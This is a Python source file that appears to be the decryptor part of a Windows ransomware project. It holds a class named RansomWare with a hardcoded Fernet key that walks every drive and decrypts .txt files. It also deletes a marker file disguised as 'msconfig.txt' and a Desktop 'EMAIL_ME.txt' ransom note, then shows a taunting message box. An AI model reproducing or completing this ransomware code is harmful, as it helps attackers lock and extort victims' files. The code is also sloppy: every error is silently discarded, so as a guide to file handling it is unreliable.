from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import string
from ctypes import windll
import ctypes
import getpass

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

class RansomWare:

    file_exts = ['txt' #, 'png'
    ]

    excepts = [(os.path.expanduser('~') + '/Desktop/EMAIL_ME.txt')]

    drives = get_drives()

    def __init__(self):
        self.key = 'st_sg3hzavEjsrwsW_flnIPbpEN1Kyfm1STLYzOfAUU='
        self.crypter = Fernet(self.key)
        self.public_key = None

        self.sysRoot = os.path.expanduser('~')
        self.localRoot = r'localRoot'

    def decrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
                _data = self.crypter.decrypt(data)
                print('File decrpyted')
                print(_data)
        except Exception as e:
            pass
            #print(e)

        try:
            with open(file_path, 'wb') as fp:
                fp.write(_data)
        except Exception as e:
            pass
            #print(e)

    def decrypt_system(self):
        for d in self.drives:
            d = d + ':/'

            system = os.walk(d, topdown=True)
            for root, dir, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path in self.excepts:
                        continue
                    if file.split('.')[-1] in self.file_exts:
                        self.decrypt_file(file_path)
                    
                    

    def checkencryption(self):
        if os.path.isfile(os.path.expanduser('~') + '/AppData/msconfig.txt'):
            return True
        else:
            with open(os.path.expanduser('~') + '/AppData/msconfig.txt', 'wb') as f:
                pass
            return False

    def deletefiles(self):
        if os.path.isfile(self.sysRoot + '/AppData/msconfig.txt'):
            os.remove(self.sysRoot + '/AppData/msconfig.txt')
        for i in self.excepts:
            if os.path.isfile(i):
                os.remove(i)

    @staticmethod
    def display_decryption_message():
        ctypes.windll.user32.MessageBoxW(0,"Congratulation!!! Your device has been successfully decrypted\nWe are terribly sorry for any inconveniance that we caused\nHope there is no bad blood between us\nIn the future, please be careful", 
        f"                                          {getpass.getuser()}", 0)

def main():

    rw = RansomWare()
    if rw.checkencryption():
        rw.decrypt_system()
        rw.deletefiles()
        rw.display_decryption_message()

if __name__ == '__main__':
    main()